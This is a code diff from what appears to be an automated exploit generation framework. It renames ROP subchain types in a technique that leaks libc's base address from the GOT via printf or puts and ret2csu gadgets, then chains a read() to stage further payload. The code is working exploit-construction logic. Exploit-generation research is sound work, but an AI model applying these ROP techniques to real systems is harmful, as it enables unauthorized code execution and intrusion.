@@ -54,7 +54,7 @@ void GotLeakLibc::resolveRequiredGadgets() {
     exploit.registerSymbol("got_leak_libc_fmt_str", exploit.getElf().bss() + 0x600);
 }
 
-std::vector<RopSubchain> GotLeakLibc::getRopSubchains() const {
+std::vector<RopPayload> GotLeakLibc::getRopPayloadList() const {
     Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
     const ELF &libc = exploit.getLibc();
@@ -82,12 +82,12 @@ std::vector<RopSubchain> GotLeakLibc::getRopSubchains() const {
 
     assert(targetSym.size() && "No suitable candiate for leaking libc base from GOT?");
 
-    std::vector<RopSubchain> ret;
+    std::vector<RopPayload> ret;
 
     if (elf.plt().find("printf") != elf.plt().end()) {
-        ret = getRopSubchainsForPrintf(targetSym);
+        ret = getRopPayloadListForPrintf(targetSym);
     } else if (elf.plt().find("puts") != elf.plt().end()) {
-        ret = getRopSubchainsForPuts(targetSym);
+        ret = getRopPayloadListForPuts(targetSym);
     }
 
     assert(ret.size() && "GotLeakLibc: no supported read primitive :(");
@@ -102,8 +102,8 @@ std::vector<RopSubchain> GotLeakLibc::getRopSubchains() const {
     return ret;
 }
 
-std::vector<RopSubchain>
-GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
+std::vector<RopPayload>
+GotLeakLibc::getRopPayloadListForPrintf(const std::string &targetSym) const {
     Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -116,46 +116,46 @@ GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
     std::string fmtStr = "%s\n";
     fmtStr.push_back('\x00');
 
-    RopSubchain part1 = ret2csu->getRopSubchains(
+    RopPayload part1 = ret2csu->getRopPayloadList(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::VAR>(elf, "got_leak_libc_fmt_str"),
         ConstantExpr::create(fmtStr.size(), Expr::Int64))[0];
 
     // read(0, 0, 0), setting RAX to 0 and RDI to 1.
-    RopSubchain part2 = ret2csu->getRopSubchains(
+    RopPayload part2 = ret2csu->getRopPayloadList(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(1, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
     // Set RSI to elf.got['read'], returning to `pop rdi ; ret`.
-    RopSubchain part3 = ret2csu->getRopSubchains(
+    RopPayload part3 = ret2csu->getRopPayloadList(
         BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName("pop rdi ; ret")),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::GOT>(elf, targetSym),
         ConstantExpr::create(0, Expr::Int64))[0];
 
-    RopSubchain part4 = {
+    RopPayload part4 = {
         BaseOffsetExpr::create<BaseType::VAR>(elf, "got_leak_libc_fmt_str"),
         BaseOffsetExpr::create<BaseType::SYM>(elf, "printf")
     };
 
     // Prepare to chain the current subchain with the next one by calling
     // read(0, ropReadDstOffset, 0x400).
-    uint64_t part5Size = ret2csu->estimateRopSubchainSize(/*arg1=*/0);
+    uint64_t part5Size = ret2csu->estimateRopPayloadSize(/*arg1=*/0);
     uint64_t ropReadDstOffset
         = sizeof(uint64_t) * (part1.size() + part2.size() + part3.size() + part4.size() + part5Size);
 
-    RopSubchain part5 = ret2csu->getRopSubchains(
+    RopPayload part5 = ret2csu->getRopPayloadList(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
         PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
         ConstantExpr::create(0x400, Expr::Int64))[0];
 
 
-    RopSubchain ret1;
-    RopSubchain ret2 = { ByteVectorExpr::create(fmtStr) };
+    RopPayload ret1;
+    RopPayload ret2 = { ByteVectorExpr::create(fmtStr) };
 
     ret1.reserve(1 + part1.size() + part2.size() + part3.size() + part4.size() + part5.size());
     ret1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
@@ -168,32 +168,32 @@ GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
     return { ret1, ret2 };
 }
 
-std::vector<RopSubchain>
-GotLeakLibc::getRopSubchainsForPuts(const std::string &targetSym) const {
+std::vector<RopPayload>
+GotLeakLibc::getRopPayloadListForPuts(const std::string &targetSym) const {
     Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
     auto ret2csu = g_crax->getTechnique<Ret2csu>();
     assert(ret2csu);
 
-    RopSubchain part1 = {
+    RopPayload part1 = {
         BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName("pop rdi ; ret")),
         BaseOffsetExpr::create<BaseType::GOT>(elf, targetSym),
         BaseOffsetExpr::create<BaseType::SYM>(elf, "puts")
     };
 
-    uint64_t part2Size = ret2csu->estimateRopSubchainSize(/*arg1=*/0);
+    uint64_t part2Size = ret2csu->estimateRopPayloadSize(/*arg1=*/0);
     uint64_t ropReadDstOffset
         = sizeof(uint64_t) * (part1.size() + part2Size);
 
-    RopSubchain part2 = ret2csu->getRopSubchains(
+    RopPayload part2 = ret2csu->getRopPayloadList(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
         PlaceholderExpr<uint64_t>::create(ropReadDstOffset),
         ConstantExpr::create(0x400, Expr::Int64))[0];
 
 
-    RopSubchain ret;
+    RopPayload ret;
 
     ret.reserve(1 + part1.size() + part2.size());
     ret.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
